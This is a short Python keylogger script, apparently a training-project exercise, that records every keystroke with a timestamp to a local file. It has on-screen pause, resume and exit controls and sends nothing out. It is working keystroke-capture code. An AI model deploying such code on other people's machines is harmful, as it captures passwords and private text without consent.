from pynput.keyboard import Listener, Key
from datetime import datetime
import os

log_file = r"C:\Users\Lenovo\OneDrive\Desktop\SkillCraft Projects\keys.txt"

open(log_file, "w").close()

logging = True

def log_to_file(key):
    os.makedirs(os.path.dirname(log_file), exist_ok=True)

    with open(log_file, "a") as f:
        f.write(f"{datetime.now():%Y-%m-%d %H:%M:%S} - {key}\n")

def on_press(key):
    global logging  

    k = getattr(key, 'char', '')

    if k == 'p' and logging:
        print("🔒 Paused keylogger")
        logging = False

    elif k == 'r' and not logging:
        print("▶️ Resumed keylogger")
        logging = True

    elif key == Key.esc:
        print("🚪 Exiting keylogger")
        return False

    if logging:
        log_to_file(key)

print("🔑 Keylogger started...\nPress 'p' to pause, 'r' to resume, 'Esc' to exit")
with Listener(on_press=on_press) as listener:
    listener.join()
